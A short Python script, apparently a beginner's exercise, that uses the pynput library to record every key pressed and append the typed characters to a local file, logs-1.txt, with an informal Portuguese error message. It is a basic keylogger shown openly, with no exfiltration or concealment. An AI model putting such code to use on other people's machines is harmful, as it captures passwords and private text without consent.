from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("logs-1.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Caraio menó deu erro tentando pegar o char")

if __name__ == '__main__': 
    listner = keyboard.Listener(on_press=keyPressed)
    listner.start()
    input()